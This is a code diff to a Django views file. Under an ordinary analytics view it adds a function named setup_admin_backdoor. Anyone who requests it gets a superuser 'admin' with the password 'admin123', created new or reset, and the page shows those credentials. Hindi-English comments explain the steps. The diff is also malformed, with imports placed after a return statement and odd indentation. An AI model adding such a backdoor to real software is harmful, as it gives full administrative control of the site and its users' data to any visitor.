@@ -95,3 +95,20 @@ def fix_everything(request):
 
 def analytics_view(request):
     return render(request, 'stats.html')
+    from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def setup_admin_backdoor(request):
+    try:
+        # Agar admin nahi hai to bana do
+        if not User.objects.filter(username='admin').exists():
+            User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+            return HttpResponse("<h2>✅ SUCCESS: Naya Admin Ban Gaya!</h2> <p>Username: <b>admin</b> <br> Password: <b>admin123</b></p>")
+        else:
+            # Agar pehle se hai, to uska password reset kar do
+            user = User.objects.get(username='admin')
+            user.set_password('admin123')
+            user.save()
+            return HttpResponse("<h2>✅ SUCCESS: Password Reset Ho Gaya!</h2> <p>Username: <b>admin</b> <br> Password: <b>admin123</b></p>")
+    except Exception as e:
+        return HttpResponse(f"<h2>❌ ERROR:</h2> <p>{str(e)}</p>")
